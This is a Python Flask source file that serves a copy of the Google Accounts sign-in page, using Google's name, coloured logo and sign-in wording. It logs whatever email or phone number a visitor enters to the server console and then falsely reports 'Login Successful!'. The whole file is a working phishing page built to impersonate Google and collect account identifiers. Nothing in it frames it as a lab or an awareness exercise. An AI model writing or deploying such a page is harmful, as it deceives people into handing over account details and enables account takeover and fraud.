from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

html_code = """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: left;
        }
        .google-logo {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 24px;
            font-weight: normal;
            margin-bottom: 8px;
            color: #202124;
        }
        p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .input-box {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #747775;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            margin-bottom: 10px;
        }
        .input-box:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin-bottom: 30px;
        }
        .link:hover {
            text-decoration: underline;
        }
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }
        .next-btn:hover {
            background-color: #1b66c9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
        </div>
        <h2>Sign in</h2>
        <p>Use your Google Account. The account will be added to this device and available to other Google apps. <a href="#" class="link" style="display:inline; margin:0;">Learn more about using your account</a></p>
        
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Email or phone" required class="input-box">
            <br>
            <a href="#" class="link">Forgot email?</a>
            <br><br>
            <a href="#" class="link" style="display:block;">Create account</a>
            
            <button type="submit" class="next-btn">Next</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(html_code)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    print(f"Username: {username}")
    return "Login Successful!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

